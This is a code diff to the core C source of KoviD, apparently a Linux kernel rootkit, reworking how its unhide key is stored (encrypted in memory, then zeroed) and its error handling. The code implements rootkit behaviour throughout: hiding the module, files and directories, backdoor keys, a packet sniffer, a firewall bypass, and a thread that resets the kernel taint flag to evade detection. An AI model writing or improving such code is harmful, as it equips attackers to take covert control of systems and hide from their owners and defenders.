@@ -31,7 +31,6 @@
 #include "lkm.h"
 #include "fs.h"
 #include "version.h"
-#include "auto.h"
 #include "log.h"
 
 #define MAX_PROCFS_SIZE PAGE_SIZE
@@ -39,10 +38,6 @@
 #define MAX_64_BITS_ADDR_SIZE 16
 #ifndef MODNAME
 #pragma message "Missing \'MODNAME\' compilation directive. See Makefile."
-#endif
-
-#ifdef DEBUG_RING_BUFFER
-#pragma message "!!! Be careful: Build kovid in DEBUG mode !!!"
 #endif
 
 #ifndef PRCTIMEOUT
@@ -67,14 +62,15 @@ struct __lkmmod_t {
 };
 static DEFINE_MUTEX(prc_mtx);
 static DEFINE_SPINLOCK(elfbits_spin);
+static struct kv_crypto_st *kvmgc_unhidekey;
 
-/** gcc  - fuck 32 bits shit (for now!) */
+// Makefile auto-generated - DO NOT EDIT
+uint64_t auto_unhidekey = 0x0000000000000000;
+
+extern uint64_t auto_bdkey;
+
 #ifndef __x86_64__
-#error "fuuuuuu Support is only for x86-64"
-#endif
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 16, 0)
-#pragma message "!! Warning: Unsupported kernel version GOOD LUCK WITH THAT! !!"
+#error "Support is only for x86-64"
 #endif
 
 MODULE_LICENSE("Dual BSD/GPL");
@@ -476,6 +472,7 @@ static const match_table_t tokens = {
 	{ Opt_unhide_directory, "unhide-directory=%s" },
 
 	{ Opt_journalclt, "journal-flush" },
+	{ Opt_fetch_base_address, "base-address=%d" },
 #ifdef DEBUG_RING_BUFFER
 	{ Opt_get_bdkey, "get-bdkey" },
 	{ Opt_get_unhidekey, "get-unhidekey" },
@@ -483,12 +480,43 @@ static const match_table_t tokens = {
 	{ Opt_unknown, NULL }
 };
 
+struct userdata_t {
+	uint64_t address_value;
+	int op;
+	bool ok;
+};
+
+void _crypto_cb(const u8 *const buf, size_t buflen, size_t copied,
+		void *userdata)
+{
+	struct userdata_t *validate = (struct userdata_t *)userdata;
+
+	if (!validate)
+		return;
+
+	if (validate->op == Opt_unhide_module) {
+		if (validate->address_value) {
+			if (validate->address_value == *((uint64_t *)buf))
+				validate->ok = true;
+		}
+	}
+#ifdef DEBUG_RING_BUFFER
+	else if (validate->op == Opt_get_unhidekey ||
+		 validate->op == Opt_get_bdkey) {
+		char bits[32 + 1] = { 0 };
+		snprintf(bits, 32, "%llx", *((uint64_t *)buf));
+		set_elfbits(bits);
+	}
+#endif
+}
+
 #define CMD_MAXLEN 128
 static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			loff_t *offset)
 {
 	pid_t pid;
 	char param[CMD_MAXLEN + 1] = { 0 };
+	decrypt_callback user_cb = (decrypt_callback)_crypto_cb;
 
 	if (copy_from_user(param, user, CMD_MAXLEN))
 		return -EFAULT;
@@ -522,10 +550,17 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			kv_hide_mod();
 			break;
 		case Opt_unhide_module: {
-			uint64_t val;
-			if ((sscanf(args[0].from, "%llx", &val) == 1) &&
-			    auto_unhidekey == val) {
-				kv_unhide_mod();
+			uint64_t address_value = 0;
+			struct userdata_t validate = { 0 };
+
+			if ((sscanf(args[0].from, "%llx", &address_value) ==
+			     1)) {
+				validate.address_value = address_value;
+				validate.op = Opt_unhide_module;
+				kv_decrypt(kvmgc_unhidekey, user_cb, &validate);
+				if (validate.ok == true) {
+					kv_unhide_mod();
+				}
 			}
 		} break;
 		case Opt_hide_file:
@@ -561,9 +596,9 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 		case Opt_unhide_directory:
 			fs_del_name(args[0].from);
 			break;
-			/* Currently, directories must
-                 * be added individually: use hide-directory
-                 * */
+			/** Currently, directories must
+			* be added individually: use hide-directory
+			*/
 		case Opt_hide_file_anywhere:
 			fs_add_name_rw(args[0].from, 0);
 			break;
@@ -578,15 +613,14 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			}
 		} break;
 #ifdef DEBUG_RING_BUFFER
-		case Opt_get_bdkey: {
-			char bits[32 + 1] = { 0 };
-			snprintf(bits, 32, "%lx", auto_bdkey);
-			set_elfbits(bits);
-		} break;
+		case Opt_get_bdkey:
 		case Opt_get_unhidekey: {
-			char bits[32 + 1] = { 0 };
-			snprintf(bits, 32, "%lx", auto_unhidekey);
-			set_elfbits(bits);
+			struct userdata_t validate = { 0 };
+			struct kv_crypto_st *mgc =
+				(tok == Opt_get_unhidekey ? kvmgc_unhidekey :
+							    kv_sock_get_mgc());
+			validate.op = tok;
+			kv_decrypt(mgc, user_cb, &validate);
 		} break;
 #endif
 		case Opt_fetch_base_address: {
@@ -782,6 +816,7 @@ static void _unroll_init(void)
 
 static int __init kv_init(void)
 {
+	u8 buf[16] = { 0 };
 	int rv = 0;
 	char *procname_err = "";
 	const char **name;
@@ -792,10 +827,8 @@ static int __init kv_init(void)
 	/*
      * Hide these names from write() fs output
      */
-	static const char *hide_names[] = { ".kovid",	   "kovid",
-					    "kovid.ko",	   UUIDGEN ".ko",
-					    UUIDGEN ".sh", ".sshd_orig",
-					    PROCNAME,	   NULL };
+	static const char *hide_names[] = { MODNAME, UUIDGEN ".ko",
+					    UUIDGEN ".sh", PROCNAME, NULL };
 
 	/** show current version for when running in debug mode */
 	prinfo("version %s\n", KOVID_VERSION);
@@ -827,24 +860,34 @@ static int __init kv_init(void)
 #endif
 	tsk_prc = kthread_run(_proc_watchdog, NULL, THREAD_PROC_NAME);
 	if (!tsk_prc)
-		goto unroll_init;
+		goto background_error;
 
 	tsk_tainted = kthread_run(_reset_tainted, NULL, THREAD_TAINTED_NAME);
 	if (!tsk_tainted)
-		goto unroll_init;
+		goto background_error;
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
 cont:
 #endif
 	/** Init crypto engine */
-	if (kv_crypto_key_init() < 0) {
+	if (kv_crypto_engine_init() < 0) {
 		prerr("Failed to initialise crypto engine\n");
 		goto crypto_error;
 	}
 
+	if (!(kvmgc_unhidekey = kv_crypto_mgc_init())) {
+		prerr("Failed to encrypt unhidekey\n");
+		kv_crypto_engine_deinit();
+		goto crypto_error;
+	}
+
+	memcpy(buf, &auto_unhidekey, 8);
+	kv_encrypt(kvmgc_unhidekey, buf, sizeof(buf));
+	auto_unhidekey = 0;
+
 	tsk_sniff = kv_sock_start_sniff();
 	if (!tsk_sniff)
-		goto unroll_init;
+		goto background_error;
 
 	if (!kv_sock_start_fw_bypass()) {
 		prwarn("Error loading fw_bypass\n");
@@ -873,21 +916,20 @@ cont:
 	prinfo("loaded.\n");
 	goto leave;
 
-unroll_init:
-	prerr("Could not load basic functionality.\n");
+crypto_error:
+	prerr("Crypto init error\n");
 	goto error;
-addr_error:
-	prerr("Could not get kernel function address, proc file not created.\n");
+background_error:
+	prerr("Could not load basic functionality.\n");
 	goto error;
 sys_init_error:
 	prerr("Could not load syscalls hooks\n");
 	goto error;
+addr_error:
+	prerr("Could not get kernel function address, proc file not created.\n");
+	goto error;
 procname_missing:
 	prerr("%s\n", procname_err);
-	goto error;
-crypto_error:
-	prerr("Crypto init error\n");
-
 error:
 	prerr("Unrolling\n");
 	_unroll_init();
@@ -921,7 +963,7 @@ static void __exit kv_cleanup(void)
 
 	fs_names_cleanup();
 
-	kv_crypto_deinit();
+	kv_crypto_engine_deinit();
 
 	prinfo("unloaded.\n");
 }
